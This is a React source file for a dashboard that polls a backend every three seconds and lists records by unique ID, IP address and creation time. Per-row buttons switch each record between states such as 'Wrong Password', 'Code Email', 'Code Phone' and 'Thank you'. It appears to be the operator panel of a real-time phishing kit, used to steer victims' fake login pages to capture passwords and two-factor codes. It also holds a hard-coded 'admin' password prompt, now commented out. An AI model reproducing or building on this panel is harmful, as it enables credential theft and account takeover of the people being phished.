import React, { useEffect, useState } from "react";
import { Row, Col, Table, Tag, Select, Button } from "antd";
import moment from "moment";
import { API_BE } from "./utils/variable";

const Dashboard = () => {
  const [is_visible, setVisible] = useState(false);
  const [loading, setLoading] = useState(false);
  const [data, setData] = useState([]);

  const getAllUsers = () => {
    setLoading(true);
    fetch(`${API_BE}/users?limit=1000&page=1`)
      .then((res) => res.json())
      .then((response) => {
        const arrayData = response?.data?.data || []
        const reverseArray = arrayData.reverse()
        setData(reverseArray);
        setLoading(false);
      })
      .catch(() => {
        setLoading(false);
      });
  };

  useEffect(() => {
    getAllUsers();
    // triggerPompt();
  }, []);

  const updateStatus = (unique_id, status) => {
    const data = {
      unique_id,
      status,
    };
    fetch(`${API_BE}/users`, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    })
      .then((response) => response.json())
      .then(() => {
        getAllUsers();
      })
      .catch(() => {
        getAllUsers();
      });
  };

  const columns = [
    {
      title: "#",
      key: "index",
      render: (text, record, index) => index + 1,
    },
    {
      title: "Unique ID",
      dataIndex: "unique_id",
      key: "unique_id",
    },
    {
      title: "IP",
      dataIndex: "ip_address",
      key: "ip_address",
    },
    {
      title: "Created At",
      dataIndex: "created_at",
      key: "created_at",
      render: (e) => {
        return <p>{moment(e).fromNow(true)}</p>;
      },
    },
    {
      title: "Status",
      dataIndex: "status",
      key: "status",
      width: "30%",
      render: (e, item) => {
        return (
          <div style={{display: "flex", flexWrap: "wrap", width: "730px", gap: "10px"}}>
            <button style={e === 0 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 0)}>Loading Screen</button>
            <button style={e === 1 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 1)}>Wrong Password</button>
            <button style={e === 2 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 2)}>Code Generator</button>
            <button style={e === 3 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 3)}>Code Email</button>
            <button style={e === 4 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 4)}>Code Phone</button>
            <button style={e === 5 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 5)}>Thank you</button>
            <button style={e === 6 ? { background: "green", color: "white" }: {}} onClick={(e) => updateStatus(item.unique_id, 6)}>60min</button>
          </div>
        );
      },
    },
  ];

  const triggerPompt = () => {
    let user = window.prompt("What's code?", "");
    if (user == "admin") {
      setVisible(true);
    } else {
      triggerPompt();
    }
  };

  useEffect(() => {
    const interval = setInterval(() => {
      getAllUsers();
      }, 3000);

    return () => {
      clearInterval(interval);
    };
  }, []);

  // if (!is_visible) return <></>;
  return (
    <div className="confirmation-container">
      <div className="header-color">
        <div className="header-container">
          <h2>Dashboard</h2>
        </div>
      </div>
      <div className="container" style={{ marginTop: 50 }}>
        <Row>
          <Col span={18} offset={3}>
            <Button
              style={{ float: "right", marginBottom: 15 }}
              onClick={() => getAllUsers()}
            >
              Refresh
            </Button>
            <Table
              dataSource={data || []}
              columns={columns}
              rowKey="unique_id"
              // loading={loading}
              sortDirections="ascend"
            />
          </Col>
        </Row>
      </div>
    </div>
  );
};
export default Dashboard;
